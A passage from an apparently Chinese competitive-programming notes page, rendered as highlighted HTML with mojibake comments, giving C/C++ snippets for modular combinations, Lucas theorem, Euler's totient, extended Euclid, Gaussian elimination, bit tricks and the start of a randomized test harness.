infact[N-K] % p;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> N, K;<br>    <span class="hljs-comment">// ç”¨scanfè¾“å…¥Nå’ŒK</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;N, &amp;K);<br>    <br>    <span class="hljs-comment">// é¢„å¤„ç†é˜¶ä¹˜å’Œé€†å…ƒ</span><br>    preprocess(N, MOD);<br>    <br>    <span class="hljs-comment">// è¾“å‡º C(N, K) % MOD</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, comb(N, K, MOD));<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Lucaså®šç†"><a href="#Lucaså®šç†" class="headerlink" title="Lucaså®šç†"></a>Lucaså®šç†</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> p = <span class="hljs-number">7</span>; <span class="hljs-comment">// æ¨¡è´¨æ•°ä¸º7</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100</span>;<br><br><span class="hljs-comment">// å¿«é€Ÿå¹‚ç®—æ³•ï¼Œç”¨äºè®¡ç®— (a^k) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">qmi</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (k) &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;  <span class="hljs-comment">// å¦‚æœ k æ˜¯å¥‡æ•°ï¼Œä¹˜ä»¥ a</span><br>        a = (LL)a * a % p;  <span class="hljs-comment">// è®¡ç®— a^2 % p</span><br>        k &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// k å³ç§»ä¸€ä½ï¼Œå‡å°‘ k çš„å¤§å°</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// è®¡ç®—ç»„åˆæ•° C(a, b) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">C</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = a; i &lt;= b; i++, j--) &#123;<br>        res = (LL)res * j % p;  <span class="hljs-comment">// ä¹˜ä¸Š a! ä¸­çš„å…ƒç´ </span><br>        res = (LL)res * qmi(i, p - <span class="hljs-number">2</span>) % p;  <span class="hljs-comment">// ä¹˜ä¸Š i! çš„é€†å…ƒï¼Œåˆ©ç”¨è´¹é©¬å°å®šç†è®¡ç®—</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// Lucas å®šç†ï¼Œç”¨äºè®¡ç®— C(a, b) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">lucas</span><span class="hljs-params">(LL a, LL b)</span> &#123;<br>    <span class="hljs-keyword">if</span> (a &lt; p &amp;&amp; b &lt; p) <span class="hljs-keyword">return</span> C(a, b);  <span class="hljs-comment">// åŸºæœ¬æƒ…å†µï¼Œç›´æ¥è®¡ç®— C(a, b)</span><br>    <span class="hljs-keyword">return</span> (LL)C(a % p, b % p) * lucas(a / p, b / p) % p;  <span class="hljs-comment">// é€’å½’åº”ç”¨ Lucas å®šç†</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Enter values for n and m: &quot;</span>;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br><br>    <span class="hljs-comment">// è®¡ç®— C(n, m) % p</span><br>    <span class="hljs-type">int</span> result = lucas(n, m);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;C(&quot;</span> &lt;&lt; n &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; m &lt;&lt; <span class="hljs-string">&quot;) % &quot;</span> &lt;&lt; p &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æ±‚æ¬§æ‹‰å‡½æ•°"><a href="#æ±‚æ¬§æ‹‰å‡½æ•°" class="headerlink" title="æ±‚æ¬§æ‹‰å‡½æ•°"></a>æ±‚æ¬§æ‹‰å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">phi</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-type">int</span> res = x;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            res = res / i * (i - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) x /= i;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) res = res / x * (x - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç­›æ³•æ±‚æ¬§æ‹‰å‡½æ•°"><a href="#ç­›æ³•æ±‚æ¬§æ‹‰å‡½æ•°" class="headerlink" title="ç­›æ³•æ±‚æ¬§æ‹‰å‡½æ•°"></a>ç­›æ³•æ±‚æ¬§æ‹‰å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]å­˜å‚¨æ‰€æœ‰ç´ æ•°</span><br><span class="hljs-type">int</span> euler[N];           <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªæ•°çš„æ¬§æ‹‰å‡½æ•°</span><br><span class="hljs-type">bool</span> st[N];         <span class="hljs-comment">// st[x]å­˜å‚¨xæ˜¯å¦è¢«ç­›æ‰</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_eulers</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>    euler[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i])<br>        &#123;<br>            primes[cnt ++ ] = i;<br>            euler[i] = i - <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            <span class="hljs-type">int</span> t = primes[j] * i;<br>            st[t] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>)<br>            &#123;<br>                euler[t] = euler[i] * primes[j];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            euler[t] = euler[i] * (primes[j] - <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•"></a>æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ±‚x, yï¼Œä½¿å¾—ax + by = gcd(a, b)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> &amp;x, <span class="hljs-type">int</span> &amp;y)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!b)<br>    &#123;<br>        x = <span class="hljs-number">1</span>; y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-type">int</span> d = exgcd(b, a % b, y, x);<br>    y -= (a/b) * x;<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜æ–¯æ¶ˆå…ƒ"><a href="#é«˜æ–¯æ¶ˆå…ƒ" class="headerlink" title="é«˜æ–¯æ¶ˆå…ƒ"></a>é«˜æ–¯æ¶ˆå…ƒ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// a[N][N]æ˜¯å¢å¹¿çŸ©é˜µ</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">gauss</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> c, r;<br>    <span class="hljs-keyword">for</span> (c = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>; c &lt; n; c ++ )<br>    &#123;<br>        <span class="hljs-type">int</span> t = r;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r; i &lt; n; i ++ )   <span class="hljs-comment">// æ‰¾åˆ°ç»å¯¹å€¼æœ€å¤§çš„è¡Œ</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; <span class="hljs-built_in">fabs</span>(a[t][c]))<br>                t = i;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[t][c]) &lt; eps) <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = c; i &lt;= n; i ++ ) swap(a[t][i], a[r][i]);      <span class="hljs-comment">// å°†ç»å¯¹å€¼æœ€å¤§çš„è¡Œæ¢åˆ°æœ€é¡¶ç«¯</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n; i &gt;= c; i -- ) a[r][i] /= a[r][c];      <span class="hljs-comment">// å°†å½“å‰ä¸Šçš„é¦–ä½å˜æˆ1</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r + <span class="hljs-number">1</span>; i &lt; n; i ++ )       <span class="hljs-comment">// ç”¨å½“å‰è¡Œå°†ä¸‹é¢æ‰€æœ‰çš„åˆ—æ¶ˆæˆ0</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; eps)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = n; j &gt;= c; j -- )<br>                    a[i][j] -= a[r][j] * a[i][c];<br><br>        r ++ ;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (r &lt; n)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r; i &lt; n; i ++ )<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &gt; eps)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// æ— è§£</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// æœ‰æ— ç©·å¤šç»„è§£</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j ++ )<br>            a[i][n] -= a[i][j] * a[j][n];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// æœ‰å”¯ä¸€è§£</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¬¬äºŒç±»æ–¯ç‰¹æ—"><a href="#ç¬¬äºŒç±»æ–¯ç‰¹æ—" class="headerlink" title="ç¬¬äºŒç±»æ–¯ç‰¹æ—"></a>ç¬¬äºŒç±»æ–¯ç‰¹æ—</h3><h3 id="æ¦‚ç‡è®ºä¸æœŸæœ›å…¬å¼â€“å‡å€¼æœŸæœ›"><a href="#æ¦‚ç‡è®ºä¸æœŸæœ›å…¬å¼â€“å‡å€¼æœŸæœ›" class="headerlink" title="æ¦‚ç‡è®ºä¸æœŸæœ›å…¬å¼â€“å‡å€¼æœŸæœ›"></a>æ¦‚ç‡è®ºä¸æœŸæœ›å…¬å¼â€“å‡å€¼æœŸæœ›</h3><h3 id="å”¯ä¸€åˆ†è§£å®šç†"><a href="#å”¯ä¸€åˆ†è§£å®šç†" class="headerlink" title="å”¯ä¸€åˆ†è§£å®šç†"></a>å”¯ä¸€åˆ†è§£å®šç†</h3><h3 id="ä½è¿ç®—"><a href="#ä½è¿ç®—" class="headerlink" title="ä½è¿ç®—"></a>ä½è¿ç®—</h3><p> ä¸€ã€åŸºæœ¬ä½è¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>å«ä¹‰</th><th>ç¤ºä¾‹ (<code>a = 5, b = 3</code>)</th><th>äºŒè¿›åˆ¶</th><th>ç»“æœ</th></tr></thead><tbody><tr><td><code>&amp;</code></td><td>ä¸</td><td><code>a &amp; b</code></td><td><code>0101 &amp; 0011</code></td><td><code>0001</code> â†’ 1</td></tr><tr><td>&#96;</td><td>&#96;</td><td>æˆ–</td><td>&#96;a</td><td>b&#96;</td></tr><tr><td><code>^</code></td><td>å¼‚æˆ–</td><td><code>a ^ b</code></td><td><code>0101 ^ 0011</code></td><td><code>0110</code> â†’ 6</td></tr><tr><td><code>~</code></td><td>å–åï¼ˆæŒ‰ä½éï¼‰</td><td><code>~a</code></td><td><code>~0101</code></td><td><code>1010</code> â†’ -6ï¼ˆè¡¥ç è¡¨ç¤ºï¼‰</td></tr><tr><td><code>&lt;&lt;</code></td><td>å·¦ç§»</td><td><code>a &lt;&lt; 1</code></td><td><code>0101 &lt;&lt; 1</code></td><td><code>1010</code> â†’ 10</td></tr><tr><td><code>&gt;&gt;</code></td><td>å³ç§»</td><td><code>a &gt;&gt; 1</code></td><td><code>0101 &gt;&gt; 1</code></td><td><code>0010</code> â†’ 2</td></tr></tbody></table><hr><p> äºŒã€å¸¸è§æŠ€å·§ä¸åº”ç”¨åœºæ™¯</p><ol><li>åˆ¤æ–­å¥‡å¶</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (x &amp; <span class="hljs-number">1</span>) <span class="hljs-comment">// å¥‡æ•°</span><br><span class="hljs-keyword">if</span> (!(x &amp; <span class="hljs-number">1</span>)) <span class="hljs-comment">// å¶æ•°</span><br></code></pre></td></tr></table></figure><ol start="2"><li>äº¤æ¢ä¸¤ä¸ªæ•°ï¼ˆä¸ä½¿ç”¨ä¸­é—´å˜é‡ï¼‰</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a = a ^ b;<br>b = a ^ b; <span class="hljs-comment">// (a ^ b) ^ b = a</span><br>a = a ^ b; <span class="hljs-comment">// (a ^ b) ^ a = b</span><br></code></pre></td></tr></table></figure><ol start="3"><li>æå–æœ€ä½ä½çš„ 1</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> lowbit = x &amp; (-x); <span class="hljs-comment">// éå¸¸å¸¸ç”¨ï¼å¿«é€Ÿæå–æœ€ä½ä½çš„1</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚ <code>x = 12</code> (1100)ï¼Œæœ€ä½ä½1åœ¨ç¬¬3ä½ï¼Œ<code>x &amp; -x = 0100</code> â†’ 4</p><p>è¿™ä¸ªæŠ€å·§æ˜¯ <strong>æ ‘çŠ¶æ•°ç»„ã€å­é›†æšä¸¾</strong> çš„æ ¸å¿ƒã€‚</p><ol start="4"><li>ä½è®¡æ•°ï¼ˆç»Ÿè®¡æœ‰å‡ ä¸ª1ï¼‰</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++å†™æ³•</span><br><span class="hljs-type">int</span> count = __builtin_popcount(x); <span class="hljs-comment">// GCCå†…å»ºå‡½æ•°</span><br></code></pre></td></tr></table></figure><p>æ‰‹åŠ¨å†™ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (x) &#123;<br>    x &amp;= (x - <span class="hljs-number">1</span>); <span class="hljs-comment">// æ¯æ¬¡æ¸…é™¤æœ€ä½ä½çš„1</span><br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p> ä¸‰ã€å¸¸è§ä½è¿ç®—é¢˜å‹</p><p>æšä¸¾å­é›†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">cppå¤åˆ¶ç¼–è¾‘<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> subset = mask; subset; subset = (subset - <span class="hljs-number">1</span>) &amp; mask) &#123;<br>    <span class="hljs-comment">// éå† mask çš„æ‰€æœ‰éç©ºå­é›†</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ¤æ–­ç¬¬ i ä½æ˜¯å¦ä¸º1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x &amp; (<span class="hljs-number">1</span> &lt;&lt; i)) <span class="hljs-comment">// ç¬¬ i ä½æ˜¯1</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®&#x2F;æ¸…é™¤&#x2F;ç¿»è½¬ç¬¬ i ä½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">x |= (<span class="hljs-number">1</span> &lt;&lt; i);   <span class="hljs-comment">// è®¾ç½®ç¬¬ i ä½ä¸º1</span><br>x &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; i);  <span class="hljs-comment">// æ¸…é™¤ç¬¬ i ä½ä¸º0</span><br>x ^= (<span class="hljs-number">1</span> &lt;&lt; i);   <span class="hljs-comment">// ç¿»è½¬ç¬¬ i ä½</span><br></code></pre></td></tr></table></figure><hr><p>å››ã€ç»¼åˆä¾‹é¢˜</p><p>ä¾‹é¢˜1ï¼šç»Ÿè®¡1çš„ä¸ªæ•°ï¼ˆHamming Weightï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hammingWeight</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (n) &#123;<br>        n &amp;= (n - <span class="hljs-number">1</span>);<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¾‹é¢˜2ï¼šä¸¤ä¸ªæ•´æ•°çš„æ±‰æ˜è·ç¦»</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hammingDistance</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> __builtin_popcount(x ^ y);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¾‹é¢˜3ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯2çš„å¹‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPowerOfTwo</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">0</span> &amp;&amp; (n &amp; (n - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å¯¹æ•°å™¨"><a href="#å¯¹æ•°å™¨" class="headerlink" title="å¯¹æ•°å™¨"></a>å¯¹æ•°å™¨</h1><p>éšæœºæ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rand() % (maxValue + <span class="hljs-number">1</span>)  <span class="hljs-comment">//ç”Ÿæˆä¸€ä¸ª [0, maxValue] ä¹‹é—´çš„éšæœºæ•°</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// ä¼˜åŒ–ç®—æ³•ï¼ˆå¾…éªŒè¯ï¼‰</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">optimizedAlgorithm</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-comment">// æ›¿æ¢ä¸ºä½ éœ€è¦éªŒè¯çš„ç®—æ³•</span><br>    <span class="hljs-comment">// ä¾‹å¦‚ï¼Œé€‰æ‹©æ’åºã€å¿«é€Ÿæ’åºã€å½’å¹¶æ’åºç­‰</span><br>&#125;<br><br><span class="hljs-comment">// æš´åŠ›ç®—æ³•ï¼ˆç”¨ä½œå¯¹æ¯”ï¼‰</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bruteForceAlgorithm</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-comment">// ä½¿ç”¨å†…ç½®çš„æ’åºç®—æ³•ä½œä¸ºæš´åŠ›ç®—æ³•ï¼ˆå¦‚ std::sortï¼‰</span><br>    